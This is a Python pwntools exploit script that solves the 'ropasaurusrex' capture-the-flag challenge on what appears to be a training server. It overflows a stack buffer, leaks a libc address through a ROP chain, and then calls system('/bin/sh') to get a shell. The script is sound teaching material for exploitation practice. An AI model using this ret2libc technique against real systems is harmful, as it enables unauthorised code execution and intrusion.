from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

if "REMOTE" not in args:
    r = process("./ropasaurusrex")
    gdb.attach(r, '''
               #b *0x08048416
               #b *0x0804841b
               c
               ''')
    input("wait")
else:
    r = remote("bin.training.offdef.it", 2014)

main = 0x0804841d
write = 0x0804830c
toleak = 0x0804961c

#let's create a loop to leak libc address by taking control of the saved ip
payload = b"A"*140 + pwnlib.util.packing.p32(write) + pwnlib.util.packing.p32(main) + pwnlib.util.packing.p32(1) + pwnlib.util.packing.p32(toleak) + pwnlib.util.packing.p32(4)
r.send(payload)

#now let's print the libc addres we leaked NB. this is not the base of libc
leak_read = r.recv(4)
read_libc = pwnlib.util.packing.u32(leak_read)
print("[!] read_libc %#x" % read_libc)

#to calculate the offset that the base of libc and calculate the difference with the leaked address
libc_base = read_libc - 0x10a0c0
print("[!] libc_base %#x" % libc_base)

#use the gadget NB. this does not owrk due to constraints but...
""" magic = libc_base + 0xdee03

payload = b"A"*140 + pwnlib.util.packing.p32(magic)
r.send(payload) """

#one we have libc we have system and /bin/sh... let's do it
#use "objdump -d libc-2.35.so | grep system"
#and then "ghex libc-2.35.so"
system = libc_base + 0x00048150
binsh = libc_base + 0x1bd0f5

payload = b"A"*140 + pwnlib.util.packing.p32(system) + pwnlib.util.packing.p32(0) + pwnlib.util.packing.p32(binsh)
r.send(payload)

r.interactive()


